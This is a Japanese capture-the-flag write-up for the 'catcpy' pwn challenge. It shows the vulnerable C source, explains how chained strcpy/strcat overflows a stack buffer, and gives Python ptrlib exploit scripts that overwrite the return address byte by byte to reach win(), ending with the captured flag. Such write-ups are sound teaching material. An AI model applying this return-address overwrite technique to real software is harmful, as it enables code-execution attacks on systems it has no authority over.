# catcpy:Pwn:148pts
`strcat` and `strcpy` are typical functions used in C textbooks.  

[catcpy.tar.gz](catcpy.tar.gz)  

`nc 34.170.146.252 13997`  

# Solution
ファイル一式と接続先が渡される。  
ソースは以下の通りであった。  
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

char g_buf[0x100];

/* Call this function! */
void win() {
  char *args[] = {"/bin/cat", "/flag.txt", NULL};
  execve(args[0], args, NULL);
  exit(1);
}

void get_data() {
  printf("Data: ");
  fgets(g_buf, sizeof(g_buf), stdin);
}

int main() {
  int choice;
  char buf[0x100];

  memset(buf, 0, sizeof(buf));
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);
  setbuf(stderr, NULL);

  puts("1. strcpy\n" "2. strcat");
  while (1) {
    printf("> ");
    if (scanf("%d%*c", &choice) != 1) return 1;

    switch (choice) {
      case 1:
        get_data();
        strcpy(buf, g_buf);
        break;

      case 2:
        get_data();
        strcat(buf, g_buf);
        break;

      default:
        return 0;
    }
  }
}
```
`strcpy`と`strcat`を選択でき、任意の回数行える。  
`win`があるのでそこへ飛ばせばよい。  
`buf`の最大まで`strcpy`を行い、その後`strcat`することで、範囲外に文字列を連結することができるとわかる。  
以下のように`win`を単純に連結する。  
```python
from ptrlib import *

elf = ELF("./catcpy")

sock = Process("./catcpy")
# sock = Socket("nc 34.170.146.252 13997")

sock.sendlineafter("> ", 1)
payload = b"A" * 0xFF
sock.sendlineafter("Data: ", payload)

sock.sendlineafter("> ", 2)
payload = b"B" * 0x19
payload += p64(elf.symbol("win"))  # 0x0000000000401256
sock.sendlineafter("Data: ", payload)

sock.sh()
```
実行してどの操作でもない`0`を選択し、プログラムを終了させると`Invalid address 0x7fa900401256`であった。  
`get_data`はNULLで読み取りを終了し、`strcat`は末尾にNULLを書き込むため上書き前アドレスが少し残っているようだ。  
どうにかして`0x7fa9`の箇所を`0x0000`にしたい。  
運のよいことに何度でも操作は行えるので、`strcat`の書き込む末尾のNULLで`0x00`埋めしてやればよい。  
以下のようにsolver.pyで行う。  
```python
from ptrlib import *

elf = ELF("./catcpy")

# sock = Process("./catcpy")
sock = Socket("nc 34.170.146.252 13997")

# 0xXXXXwin
sock.sendlineafter("> ", 1)
payload = b"S" * 0xFF
sock.sendlineafter("Data: ", payload)

sock.sendlineafter("> ", 2)
payload = b"A" * 0x19
payload += p64(0xAAAAAAAAAA)
sock.sendlineafter("Data: ", payload)

# 0x00XXwin
sock.sendlineafter("> ", 1)
payload = b"S" * 0xFF
sock.sendlineafter("Data: ", payload)

sock.sendlineafter("> ", 2)
payload = b"B" * 0x19
payload += p64(0xBBBBBBBB)
sock.sendlineafter("Data: ", payload)

# 0x0000win
sock.sendlineafter("> ", 1)
payload = b"S" * 0xFF
sock.sendlineafter("Data: ", payload)

sock.sendlineafter("> ", 2)
payload = b"C" * 0x19
payload += p64(elf.symbol("win"))  # 0x401256
sock.sendlineafter("Data: ", payload)

sock.sendlineafter("> ", 0)

sock.sh()
```
実行する。  
```bash
$ python solver.py
[+] __init__: Successfully connected to 34.170.146.252:13997
[ptrlib]$ Alpaca{4_b4sic_func_but_n0t_4_b4s1c_3xp101t}[+] thread_recv: Connection closed by 34.170.146.252:13997
```
flagが得られた。  

## Alpaca{4_b4sic_func_but_n0t_4_b4s1c_3xp101t}